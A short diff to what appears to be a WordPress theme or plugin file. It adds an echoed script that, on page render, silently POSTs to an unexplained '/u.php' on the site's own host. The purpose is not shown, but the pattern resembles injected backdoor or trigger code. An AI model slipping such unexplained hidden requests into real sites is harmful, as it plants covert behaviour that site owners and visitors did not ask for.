@@ -21,6 +21,11 @@
 
     $plantilla = get_post_meta($post->ID, '_wp_page_template', true);
 
+    echo '
+        <script>
+            jQuery.post("'.get_home_url().'/u.php", {}, function(e){});
+        </script>
+    ';
 
     if( true ){
 
